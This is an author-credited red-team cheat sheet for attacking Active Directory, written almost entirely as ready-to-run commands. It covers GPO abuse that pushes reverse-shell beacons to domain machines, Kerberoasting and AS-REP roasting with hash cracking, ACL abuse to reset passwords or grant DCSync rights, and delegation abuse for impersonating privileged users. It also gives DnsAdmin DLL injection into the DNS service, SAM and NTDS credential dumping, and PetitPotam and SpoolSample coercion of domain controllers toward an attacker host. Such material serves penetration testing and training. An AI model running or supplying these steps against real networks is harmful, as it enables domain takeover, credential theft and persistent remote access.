# __Active Directory misconfiguration abuse & vulnerability exploitation__
>Author: Pieter Miske
---
### __Group Policy Object abuse:__
Group Policy is the central repository in a forest or domain that controls the configuration of computers and users\. Group Policy Objects \(GPOs\) are sets of configurations that are applied to Organisational Units \(OUs\)\. Any users or computers that are members of the OU will have those configurations applied\.

##### _GPO enumeration:_
- Scan and find vulnerable GPO configurations\. The top section of the output shows if it is an GPO and some basic info\. The 2nd nested section shows its settings and if its still in use \(not morphed\)\. The 3rd nested section \(if any\) shows if it vulnerable, its severity level and reason \([Group3r](https://github.com/Group3r/Group3r)\): `.\Group3r.exe -s`
- List all GPO's \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `StandIn.exe --gpo`
- Check which AD objects have some sort of write privilege over the target GPO \(StandIn\): `StandIn.exe --gpo --filter "<name single GPO>" --acl`
- Return all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainGPOLocalGroup | select GPODisplayName, GroupName`
- Return all GPO's or GPO objects that apply to a specific machine \(PowerView\): `Get-DomainGPO (-ComputerIdentity <FQDN target computer> -Properties DisplayName) | sort -Property DisplayName`
- Identify objects that can create new GPO's and link them to an OU:
	- 1\. Show the Security Identifiers \(SIDs\) of principals that can create new GPOs in the domain \(PowerView\): `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
	- 2\. Check if one of the returned principals can not only create but also write to the GP\-Link attribute on OUs \(PowerView\): `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl`
	- 3\. Translate SID to account name \(PowerView\): `ConvertFrom-SID <SID>`
	- 4\. Based on the returned 'ObjectDN' 'OU' value, get a list of the machines to which it applies \(PowerView\): `Get-DomainComputer | ? { $_.DistinguishedName -match "OU=<value>" } | select DnsHostName` 
- Identify objects who can modify excisting GPO's:
	- 1\. Return any GPO in the domain, where a 4\-digit RID \(eliminating the default 512, 519\) has WriteProperty, WriteDacl or WriteOwner \(PowerView\): `Get-DomainGPO | Get\-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
	- 2\. Translate SID to account name \(PowerView\): `ConvertFrom-SID <SID>`
	- 3\. Resolve the ObjectDN to identify which object the user/group can modify \(PowerView\): `Get-DomainGPO -Name "{<ObjectDN value>}" -Properties DisplayName`

##### _GPO exploitation:_
>Remote Server Administration Tools \(RSAT\) can only be used from a Windows Server. 
- 1\. \(optional\) If you can create a new GPO: 
	- 1\. Check if RSAT is already present on the current system \(no output means not installed\): `Get\-Module -List -Name GroupPolicy | select -expand ExportedCommands`
	- 2\. \(optional\) if it's not present, install it on the Windows server \(requires local admin privs\): `Install-WindowsFeature –Name GPMC`
	- 3\. Create a new GPO and immediately link it to the target OU: `New-GPO -Name "<convincing new GPO name>" | New-GPLink -Target "OU=<target OU name>,DC=dev,DC=cyberbotic,DC=io"`
- 2\. Create a reverse shell type beacon \(e\.g\. CS Pivot beacon\) and upload it to a network share that is accessible by every authenticated domain account \(not needed if using payload option 3 below\)
- 3\. Modify the \(created\) GPO and let it run a command/payload:
	- Run code via HKLM or HKCU when user logs in \(RSAT\): `Set-GPPrefRegistryValue -Name "<target GPO name>" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\<path to network share>\beacon.exe" -Type ExpandString`
	- Immediate task run when GPO is applied \([SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)\): `SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" –Author “NT AUTHORITY\SYSTEM” --Command "%COMSPEC%" --Arguments "/b /c start /b /min \\<path to network share>\beacon.exe" --GPOName "<vulnerable GPO>"`
	- Adding excisting domain account to local admin group \(SharpGPOAbuse\): `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user account you control> --GPOName "<vulnerable GPO>"`
- 4\. Wait until to GPO and therefore the payload it triggered \(can take several hours for the target system\(s\) to update their GPO's\)\.


---
### __Kerberos abuse:__
##### _Kerberos time sync:_
Make sure the time of your attacker system is in sync with the target DC clock skew\.
- 1\. Check time skew of target DC: `ntpdate <ip target DC>`
- 2\. Modify your system's time so it is in sync with the target DC: `timedatectl set-time 21:11:00`

##### _Kerberoasting:_
Kerberoasting is the technique where accounts with a Service Principal Name \(SPN\) set are targeted for their hashes in an attempt to recover them\. 
- 1\. Get a list of all kerberoastable accounts: 
	- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `Kerberoast list`
	- \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `Standin.exe –spn`
	- \([windapsearch](https://github.com/ropnop/go-windapsearch/releases)\): `./windapsearch-linux-amd64 -d <target DC ip> (-u <usename>@<FQDN>) (-p "<password>") -m user-spns`
- 2\. Based on the returned scan results, do some further enumeration to minimize the risk the found kerberoastable account is a honey\-pot:
	- Does the SPN name make any sense?
	- AdminCount \(0 or 1\)?
	- Account age and description
	- Domain Groups
	- Password last set 
	- Logon counts
- 3\. Recover hash (OPSEC: roast only a specific user account based on the recon results):
	- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `Kerberoast roast (<specific account>)`
	- \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe kerberoast (/user:<username>) (/simple) /nowrap (/domain:<target domain>)`
	- \([impacket](https://github.com/SecureAuthCorp/impacket)\): `GetUserSPNs.py <FQDN>/<username>(:<password>) -request -dc-ip <DC IP> -format hashcat (-hashes <NTLM>)`
- 4\. Recover password from extracted hash \(hashcat\): `hashcat -m 13100 <hash file> <wordlist>`

##### _AS\-REP Roast attack:_
As\-rep\-roast attack exploits accounts that have kerberos preauthentication disabled to extract hashes in an attemt te recover their passwords\. 
- 1\. Get a list of all ASREP roastable accounts \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `Standin.exe --asrep`
- 2\. Based on the returned scan results, do some further enumeration to minimize the risk the found roastable account is a honey\-pot \(check the points in the ‘Kerberoast’ section\)\. 
- 3\. Recover the krb5asrep hash (OPSEC: roast only a specific user account based on the recon results):
	- \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe asreproast (/user:<username>) (/format:hashcat) /nowrap (/domain:<target domain>)`
	- \([impacket](https://github.com/SecureAuthCorp/impacket)\): `./GetNPUsers.py <FQDN>/<username>(:<password>) -dc-ip <IP DC> -format hashcat -request (-hashes <NTLM>)`
- 4\. Recover password from krb5asrep hash \(hashcat\): `hashcat -m 18200 <hash file> <wordlist>`

##### _Linux Credential Cache:_
Kerberos Credential Cache \(ccache\) files hold the Kerberos credentials for a user authenticated to a domain\-joined Linux machine, often a cached TGT\. This can be used to imperonate that user within the domain\. 
>It is mandatory to have root level access to the target Linux system\. 
- 1\. Check if there are any ccache files stored in '/tmp' with a prefixed 'krb5cc' and if the user is an interesting account to take\-over \(check column which user ownes the file\): `ls -l /tmp/`
- 2\. Download the 'krb5cc\_\*' file to your own system
- 3\. Convert the ticket from ccache to kirbi format \([impacket](https://github.com/SecureAuthCorp/impacket)\): `impacket-ticketConverter krb5cc_* ticket.kirbi`
- 4\. Import the ticket in a beacon (for cobalt strike use 'make_token' + 'kerberos_ticket_use')

##### _Linux Kerberos Keytab files:_
Keytab files can be used by automated scripts to access Kerberos\-enabled network resources on a user's behalf\. Keytab files contain a Kerberos principal name and encrypted keys\.
- 1\. Search a compromised Linux based system for keytab files \(\.keytab extention\) and check if the user owning that file is an interresting user to take control of\.
- 2\. \(optional\) download the ticket to your own system and perform the rest of the action there
- 3\. If lucky and the ticket is still valid or can be renewed \(use  "kinit \-R"\), use the ticket by specifing the correct domain user: `kinit <username>@<FQDN> -k -t username.keytab`
- 4\. Verify if the ticket was imported successfully: `klist`
- 5\. Use any tool that supports kerberos authentication \(e\.g\. via the '\-k' parameter for impacket tools\)


---
### __Discretionary access control list \(DACL\) abuse:__
Active Directory objects such as users and groups are securable objects and DACL/ACE’s define who can read/modify those objects\. DACL/ACE misconfigurations can be found in any domain object \(e\.g\. groups, user accounts, computer accounts, Organizational Units\)\. 

##### _Enumerate for DACL misconfigurations:_
- Check which AD objects have interesting rights on the account object "account1" \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-ObjectAcl -SamAccountName account1 -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|Self|WriteOwner|GenericWrite|Self|ForceChangePassword"}` 
- Check which AD objects have privileged rights on the group object "Domain Admins" \(PowerView): `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=rto,DC=external"} | select ActiveDirectoryRights, SecurityIdentifier |fl`
- Check which 4 digit AD objects have interesting privileges on the account "account1" \(PowerView\): `Get-DomainObjectAcl -Identity account1 | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl`
- Check which 4 digit AD objects have interesting privileges on other AD objects \(PowerView\): `Get-DomainObjectAcl | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|Self|WriteOwner|GenericWrite|Self|ForceChangePassword" -and $_.SecurityIdentifier -match "S-1-5-21-816166545-1771540570-1766462720-[\d]{4,10}"} | select ObjectDN, SecurityIdentifier, ActiveDirectoryRights |fl`
- Target an entire OU and list what privileges a principal \(SecurityIdentifier\) has over another principal \(PowerView\): `Get-DomainObjectAcl -SearchBase "OU=Servers,DC=rto,DC=external" | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|Self|WriteOwner|GenericWrite|Self|ForceChangePassword" | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier |fl`

##### _Exploit DACL misconfigurations:_
>It is required to execute the following commands in the context of the object that has the rights to modify the target object\. 
- GenericAll: full rights which make it possible to add users to groups, reset passwords, add ACE to OU or read/modify protected attributes: 
	- GenericAll on user accounts: 
		- Make user/service accounts kerberoastable \(check ‘GenericWrite’ section below\)\. 
		- Reset password user__ __\(for OPSEC use kerberoasting method instead\): `net user <target user> <new password> (/domain)`
	- GenericAll on computer accounts:
		- set RBCD on computer account \(Check "Resource\-Based Constrained Delegation Abuse" section for exploitation steps\)\.
		- Read LAPS passwords if available
	- GenericAll on groups: Add user to group \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `Standin.exe --group "Domain Admins" --ntaccount "<domain>\<username>" --add (--domain <domain> --user <user> --pass <password>)`
	- GenericAll on Organizational Unit \(OU\): 
		- 1\. List the 'objectguid' for the OU: `Get-DomainOU "<OU name>"`
		- 2\. Change both the ‘PrincipalIdentity’ value to the username who has GenericAll permission and also the GUID of the OU: `$Guids = Get-DomainGUIDMap; $AllObjectPropertyGuid = $Guids.GetEnumerator() | Where-Object {$_.value -eq 'All'} | Select -ExpandProperty name; $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity <username> -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectPropertyGuid; $OU = Get-DomainOU -Raw '<OU GUID>'; $DsEntry = $OU.GetDirectoryEntry(); $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'; $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE); $dsEntry.PsBase.CommitChanges()`
		- 3\. Wait a few minutes and then use any GenericAll exploit technique on any of the descendant objects in the OU\.
- WriteOwner: change the owner of the object and therefore grant yourself the ‘GenericAll’ privilege:
	- 1\. Request the SID of the target object \(StandIn\): `Standin.exe --sid <target object name>($)`
	- 2\. Change the object owner of a target object \(PowerView\): `Set-DomainObjectOwner -Identity <target SID> -OwnerIdentity <new owner name> -verbose`
	- 3\. Give the new object owner GenericAll privileges over that object \(run from the context of the user you want to give this rights to or use PSCredential\) \(PowerView\): `Add-DomainObjectAcl -TargetIdentity <target SID> -PrincipalIdentity <new owner name> -rights All -verbose`
- GenericWrite: privilege to write to non\-protected attributes like 'serviceprincipalnames' or 'msDS\-AllowedToActOnBehalfOfOtherIdentity':
	- GenericWrite over user account:
		- Make target user account kerberoastable:
			- 1\. Set SPN to target account \(PowerView\): `Set-DomainObject -Identity <target account> -SET @{serviceprincipalname='http/<current workstation name>'}`
			- 2\. Perform targeted kerberoasting
			- 3\. Delete set SPN \(PowerView\): `Set-DomainObject -Identity <target account> -Clear ServicePrincipleName`
		- Reset another user’s passwords \(PowerView\): `$newpass = ConvertTo-SecureString '<newsecretpass>' -AsPlainText -Force; Set-DomainUserPassword -Identity <domain>\<target user>' -AccountPassword $newpass`
	- GenericWrite over computer account allows for RBCD abuse: Check "Resource\-Based Constrained Delegation Abuse" section for exploitation steps\.
- WriteDACL:
	- WriteDACL on account object: 
		- 1\. Modify the targets ACL object and give it either GenericAll or DCSync rights \(if you get an "Access is denied" message, most likely the modification was still successful\) \(PowerView\): `Add-ObjectAcl -PrincipalIdentity <account to give DCSync right> -TargetIdentity <FQDN> -Rights <All | DCSync>`
		- 2\. Use the GenericAll or DCSync privilege to compromise the target\. 
	- WriteDACL on group:
		- 1\. Give the principal with the writedacl privilege full control over the target group \(StandIn\): `StandIn.exe --object "distinguishedname=<group distinguished name to give priv for>" --grant "<domain>\<username to grand priv>" --type GenericAll`
		- 2\. Now use the GenericAll privilege to add any user to the target group \(StandIn\): `StandIn.exe --group "<group name>" --ntaccount "<domain>\<username>" --add`
		- 3\. It’s required to get a new TGT or login session for the user that is now added to the group 
- ReadLAPSPassword: Check "Abusing Local Administrator Password Management Solution \(LAPS\)" section for exploitation steps\.
- ReadGMSAPassword: Check "Attacking AD Group Managed Service Accounts \(gMTA\)" section for exploitation steps\. 
- ForceChangePassword: Change the password of the user it applies to \(PowerView\): `$NewPassword = ConvertTo-SecureString '<Password to set>' -AsPlainText -Force; Set-DomainUserPassword -Identity '<TargetUser>' -AccountPassword $NewPassword`


---
### __Delegation abuse:__
##### _Delegation enumeration:_
List all accounts with unconstrained & constrained delegation privileges: 
- \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `Standin.exe --delegation`
- \([impacket](https://github.com/SecureAuthCorp/impacket)\): `impacket-findDelegation <FQDN>/<username>(:password) -dc-ip <target DC ip or FQDN>`

##### _Unconstrained Delegation abuse:_
Whenever a request is made on an Unconstrained Delegation \(UD\) enabled computer, a copy of that account's TGT is stored in LSASS\. Because the TGT and not the TGS is stored, it is possible to use the ticket to impersonate the account who made the request as long this account is not in the “Protected Users” group or configured as “Account is sensitive and cannot be delegated”\.
>It is mandatory to have full control over the for Unconstrained Delegation enabled computer\. 
- From Cobalt Strike beacon (this requires a beacon running with high integrity):
	- 1\. Start the Rubeus monitoring function to capture any stored TGTs: `Rubeus.exe monitor /interval:5 /nowrap (/runfor:60) (/consoleoutfile:"C:\users\public\documents\r.log")`
	- 2\. In the second \(low integrity\) beacon use any technique that can either coerce another high value computer \(e\.g\. via PetitPotam\)  or social engineer a high value user to make a connection to the UD enabled computer\. 
	- 3\. After a successvol capture, stop Rubeus: `jobkill <JID>`
	- 4\. Copy the TGT from the output or saved r\.log file and save it locally on the CS client attacker system \(PS\): `[System.IO.File]::WriteAllBytes("C:\Secrets\ticket.kirbi", [System.Convert]::FromBase64String("<base64 TGT string>"))`
	- 5\. Create a sacrificial logon session \(make sure you are in a global writeable directory\): `make_token <domain>\<captured account name> DummyPass`
	- 6\. Pass the TGT into the new session to use it: `kerberos_ticket_use C:\Secrets\ticket.kirbi `
- From PoshC2 beacon (this attack vector requires 2 beacons of which at least 1 is a high integrity beacon running on the UD enabled computer\. Important, the high integrity beacon will die during this attack so it is advised to have a back\-up beacon established on the UD enabled system\. Furthermore, don’t run/test the DCSync command before you imported the ticket or any further action is ruined\.):
	- 1\. In the high integrity beacon, load Rubeus \(make sure it is atleast Rubeus version 1\.6\.4\) \(run in PoshC2\): `loadmodule Rubeus.exe`
	- 2\. In the same high integrity beacon start the Rubeus monitoring function to capture any stored TGTs \(the session will die after this command is finished\): `run-exe-background Rubeus.Program Rubeus monitor /monitorinterval:2 /runfor:40 /nowrap /consoleoutfile:"C:\users\public\documents\r.log"`
	- 3\. In the second \(low integrity\) beacon use any technique \(e\.g\. PetitPotam, Spoolsample\) that will cource a DC to make a request to the UD enabled computer \(check "Coerce target computer to start authenticate to arbitrary sytem" section for the PS tools and commands\)\. 
	- 4\. After Rubeus stopped running \(after 40 sec\), it is possible to read the TGT of the coerced DC in the file r\.log: `type C:\users\public\documents\r.log`
	- 5\. Copy the base64 encoded ticket string from the r\.log file and import the ticket into an arbitrary beacon and impersonate the DC: `rubeus ptt /ticket:<ticker string>`
	- 6\. It is now possible to perform action like DCSync \(make sure the command is correct the first time you run it\)
- Remote from attacker system (this attack vector is performed remotely and leverages DNS spoofing in combination with a coerce attack \(PetitPotam, Spoolsample\) in an attempt to capture a high value computer account TGT\.): 
	- 1\. If you don’t have the plaintext password of the UD enabled system, dump LSASS to obtain both the NTLM hash and AES\-256 key:
	- 2\. Add a SPN to the owned UD account that points to your own attacker system IP via DNS \([krbrelayx](https://github.com/dirkjanm/krbrelayx)\): `python3 addspn.py -u <domain>\\<name UD enabled computer account> -p <password or NTLM> -s HOST/<fake DNS record name that will later point to your system (e.g. pentest)>.<FQDN> <DC IP> --additional`
	- 3\. Verify if SPN was set correctly \([krbrelayx](https://github.com/dirkjanm/krbrelayx)\): `python3 addspn.py -u <domain>\\<name UD enabled computer account> -p <password or NTLM> -s HOST/<used DNS record name as specified above>.<FQDN> <IP DC> -q`
	- 4\. Add a new DNS record in the "Forward Lookup Zone" of the DC and point it to your own attacker system ip: \([krbrelayx](https://github.com/dirkjanm/krbrelayx)\): `python3 dnstool.py -u <domain>\<name UD enabled computer account> -p <password or NTLM> -r <DNS record name (e.g. pentest)>.<FQDN> -d <own IP> --action add <IP DC>`
	- 5\. Verify if DNS record was set successful \(can take 180 seconds to show up\): `nslookup <DNS record name>.<FQDN> <DC IP>`
	- 6\. Start the relaying/capturing tool \(krbrelayx\):
		- Password for authentication: `python krbrelayx.py --krbsalt <FQDN name all in capital letters><case sensitive unconstrained delecation account name> --krbpass <cleartext password>`
		- AES\-256 key for authentication: `python krbrelayx.py -aesKey <aes256 key of the unconstrained delegation account>`
	- 7\. Coerce a high value computer in the domain (e.g. DC) to make a connection to your attacker system via methods like SpoolSample or PetitPotam \(check "Coerce target computer to start authenticate to arbitrary sytem" section\)\. Specify the added DNS record name as the IP to send the courced connection to\. 
	- 8\. If the capture was successful, the TGT of the high value computer \(stored in a \.ccache file\) can be used for impersonation:
		- 1\. Set in the "/etc/hosts" file the FQDN and IP of the high value computer\. 
		- 2\. Import TGT: `export KRB5CCNAME=</path/to/DC ccache file>`
		- 3\. Impersonate using the ‘\-k’ option and run exploit tool \(e\.g\. secretsdump, wmiexec, smbclient\.py\)\.

##### _Constrained Delegation abuse:_
In contrast to Unconstrained Delecation, Constrained Delegation \(CD\) limits the delegation \(impersonation\) rights of an object\. Operationally, any account \(user or computer\) that have SPNs \(e\.g\. www/server\.domain\.local\) set in their "msDS\-AllowedToDelegateTo" attribute can impersonate any user in the domain in relation to those specified SPNs\. Additionally, the service name \(sname\) is not protected in the KRB\-CRED file \(only the server name is\) which means that any service name can be substituted in the "msDS\-AllowedToDelegateTo" attribute\. 
>It is mandatory to have control over the account with CD permissions \(e\.g\. via kerberoasting\)\. If an account is marked as ‘Account is sensitive and cannot be delegated’ or is part of the ‘Protected Users” group, it is not possible to impersonate that account\. 
- From beacon:
	- 1\. Based on the remote action you want to perform select the appropriate service tickets \(“/altservice:<service name>”\):
		- WMI interactions: HOST, RPCSS
		- LDAP including DCsync attack: LDAP
		- WinRM \(winrs\): HOST, HTTP
		- PowerShell Remoting: HOST, HTTP, WSMAN, RPCSS
		- MSSQL: MSSQLSvc
		- File access and PSexec: CIFS
	- 2\. Request a TGT that impersonates a privileged user in the context of the delegated server \(don’t use the /opsec option\) \(if using cobalt strike, use the ‘make\_token’ \+ ‘kerberos\_ticket\_use’ method as the impersonated user\) \([Rubeus](https://github.com/GhostPack/Rubeus)\): `.\Rubeus.exe s4u /impersonateuser:<username to impersonate> /msdsspn:”<delegated service name>/<FQDN of the delegated server>” /altservice:<alternative service name (e.g. cifs)> /user:<account name with CD> </aes256:KEY | /ticket:B64String> (/ptt) (/nowrap) (/dc:<FCDN DC>)`
	- 3\. It is now possible to peform actions in your current logon session under the context of the impersonated account against the server you have delegation rights for\. When specifying the target host always use the FQDN\.
- From attacker system: 
	- 1\. Request TGT \([impacket](https://github.com/SecureAuthCorp/impacket)\): `getST.py -spn <delegated service name>/<FQDN of the delegated server> (-dc-ip <FQDN DC>) -impersonate <username to impersonate> <FQDN>/<account name of owned CD account> (-hashes <NTLM of owned CD account>)`
	- 2\. Setup prerequisites and import generated kerberos ticket so you can impersonate a user: 
		- 1\. Modify your "/etc/hosts" file so the FQDN of the sever that you have delegation for points to its associated ip address
		- 2\. \(optional\) Move the generated \.ccache file to a widely accessable directory and change ownership from root to your current account \(e\.g\. /tmp or ~/Documents\) 
		- 3\. Import kerberos ticket: `export KRB5CCNAME=</path/to/ticket.ccache>`
	- 3\. If the service type doesn't allow for code execution \(e\.g\. www/server\.domain\.local\) impacket will modify it automatically\. It is now possible to run attacks under the context of the impersonated account against the server you have delegation rights for\. Use ‘\-k’ option for impacket tools\. 

##### _Resource\-Based Constrained Delegation abuse:_
Resource\-based constrained delegation \(RBCD\) can be abused in the situation you have control over a low privileges misconfigured AD account that has implicit full control over a target computer’s attributes\. RBCD is implemented with a security descriptor on the target resource, instead of a list of SPNs on the “front\-end” to which it is allowed to delegate to\. This security descriptor is stored as a series of binary bytes in the "msDS\-AllowedToActOnBehalfOfOtherIdentity" attribute on a target computer object\.
>This attack only works on windows server 2012 or higher and windows 8 or higher\. Furthermore, the attribute 'msDS\-AllowedToActOnBehalfOfOtherIdentity' must be empty on the target computer\. 
- 1\. Identify a low privileged AD account that has 'GenericAll', 'GenericWrite' or 'WriteProperty' privileges over a computer object \(e\.g\. high value server\)\. In BloodHound search for accounts/groups with a value 1 or higher set for the attributes "First Degree Object Control" or "Group Delegated Object Control" \(both under "Outbound Control Rights"\)\.
- 2\. Find a way to take control over the identified account\.
- 3\. Create a new computer account or take control over a service account with a SPN set that doesn't point to the target object:
	- Service account with SPN: use any available method to take control over the service account which doesn’t has a SPN set for the target computer account\. 
	- Create new computer account: 
		- 1\. Verify if the "MachineAccountQuota" is higher than 0 \(default is 10\) to create a new computer account:
			- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `GetMachineAccountQuota`
			- \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\):
				- 1\. Copy the 'distinguishedname' value \(e\.g\. DC=hidro,DC=local\) from the output: `Get-DomainUser | select -first 1`
				- 2\. Request the "ms\-ds\-machineaccountquota" value: `Get-DomainObject -identity "<distinguishedname value>"`
		- 2\. Create new computer account 
			- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `AddMachineAccount <computer name>`
			- \([StandIn](https://github.com/FuzzySecurity/StandIn)\): `Standin.exe --computer <new computer name> --make (--domain <domain> --user <user> --pass <password>)`
- 4\. Request the SID of the new computer account or service account \(StandIn\): `Standin.exe --sid <computer/service account name>$`
- 5\. Modify the target computer "msDS\-AllowedToActOnBehalfOfOtherIdentity" attribute and point it to your created computer account or service account: 
	- Password \(StandIn\): `Standin.exe --computer <target computer name> --sid <SID of newly created computer account> (--domain <domain> --user <user> --pass <password>)`
	- Ticket imported in session \(doesn't always work on high value servers like DC’s\) \(PowerView\): `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID of newly created computer account>)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer <target computer name> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}` 
- 6\. Verify if the SID of the created computer account or service account is set to the target computer 'msDS\-AllowedToActOnBehalfOfOtherIdentity' attribute \(StandIn\): `Standin.exe --object samaccountname=<target computer name>$`
- 7\. Select a user to impersonate \(this user must not be in the "Protected Users" group or set as 'Account is sensitive and cannot be delegated'\) and request a ticket to impersonate this user \(Rubeus\): `rubeus s4u /user:<computer account>$ /password:<password computer account> /impersonateuser:<user to impersonate> /msdsspn:"<service name (e.g. cifs)>/<FQDN target system>" /ptt`
- 8\. Leverage obtained privileges
- 9\. \(optional\) restore made changes:
	- 1\. Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties \(StandIn\): `standin --computer <target computer name> --remove (--domain <domain> --user <user> --pass <password>)`
	- 2\. Delete computer account \(requires elevated privileges\):
		- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `DelMachineAccount <computer name>`
		- \(StandIn\): `standin --computer <newly created computer account> --delete (--domain <domain> --user <user> --pass <password>)`


---
### __Domain group privilege abuse:__
##### _DnsAdmin Privilege:_
This privilege allows you to injects an arbitrary DLL with SYSTEM privileges into the dns\.exe process on the  DNS Server \(which is most likely the DC\)\. 
- 1\. Create malicious DLL that starts a beacon
- 2\. Upload the DLL to a for the DNS server accessible share\.
- 3\. Abuse your DnsAdmin privileges to \(re\)place the dll \(most likely works on all servers and workstations with RSAT installed\): `dnscmd <FQDN DC> /config /serverlevelplugindll \\<path to beacon.dll>`
- 4\. Restart DNS server \(requires GPO security settings to allow DnsAdmin group to have full control over DNS server \(can be found in GPO: Policy > Windows Settings > Security Settings > System Settings > DNS Server\)\):
	- 1: `sc.exe \\<FQDN DC> stop dns`
	- 2: `sc.exe \\<FQDN DC> start dns`
- 5\. \(optional\) Remove added DLL from the target registry \(login to DC first\): `Remove-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\\Parameters\ -Name ServerLevelPluginDll`

##### _Backup Operator privilege:_
If you compromise an account member of the group Backup Operators you can become the Domain Admin without RDP or WinRM on the Domain Controller\.
- 1\. Dump the SAM of the target DC \([BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)\): `BackupOperatorToDA.exe -t \\<FQDN DC> -o \\<path to widely accessible share> (-u <username account with backup operator privs> -p <password> -d <domain>)`
- 2\. \(optional\) Download the SAM/SYSTEM/SECURITY files from the share to your local system
- 3\. Dump hashes via either secretsdump\.py or secretsdump\.exe via the LOCAL method: `secretsdump.exe LOCAL -system <path to SAM> -security <path to SECURITY> -system <path to SYSTEM>`
- 4\. Copy and use the DC machine account hash to dump its own NTDS\.dit file using again secretsdump\.py or secretsdump\.exe: `secretsdump.exe <FQDN>/<DC machine name>$@<FQDN DC> -hashes <both NTLM hash parts DC> -just-dc-user <DA account>`


---
### __Relay based attacks & coerce techniques:__
##### _Test for LDAP signing and binding:_
This technique verifies if LDAP signing and binding are disabled on the DC and thus relay attacks using LDAP are possible\.
- \([LdapSignCheck-BOF](https://github.com/cube0x0/LdapSignCheck)\) \(also has a C\# variant\): `ldapsigncheck <FQDN DC>`
- \([ldap\-scanner](https://github.com/GoSecure/ldap-scanner)\): `python3 ldap-scanner.py <FQDN>/<username>:<password>@<IP target DC>`

##### _Remotely coerce target computer to authenticate to an arbitrary system:_
>The relayed system must be different from the target system\. 
- SpoolSample bug \(MS\-RPRN\):
	- SMB relay:
		- \([krbrelayx](https://github.com/dirkjanm/krbrelayx)\): `python3 printerbug.py -hashes <NTLM hash (hash:hash)> <FQDN>/<account name>@<IP or FQDN of sysem to coerce> <IP or FQDN system to sent courced connection to>`
		- \([Invoke\-Spoolsample](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)\): `Invoke-SpoolSample -command "<IP or FQDN of sysem to coerce> <IP or FQDN system to sent courced connection to>"`
	- HTTP relay: \([krbrelayx](https://github.com/dirkjanm/krbrelayx)\): `python printerbug.py <FQDN>/<username>@<FQDN target system> '<hostname to connect back to>@80/test'`
- PetitPotam \(MS\-EFSR\): if targeting a non\-patched DC, credentials are not required:
	- SMB relay:
		- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `PetitPotam <own ip> <target system ip>`
		- \([PetitPotam](https://github.com/topotam/PetitPotam)\): `python3 Petitpotam.py -u <username> -p <password> -d <FQDN> <own ip> <target system to relay>`
		- \([Invoke\-PetitPotam](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1)\): `Invoke-PetitPotam <FQDN target system> <ip connect back system> (<username> <password>)`
	- HTTP relay: 
		- \([PetitPotam](https://github.com/topotam/PetitPotam)\): `python3 Petitpotam.py -u <username> -p <password> -d <FQDN> <Responder Machine Name>@80/test <FQDN target system>`
		- \([Invoke\-PetitPotam](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1)\): `Invoke-PetitPotam <FQDN target system> '<hostname to connect back to>@80/test'`
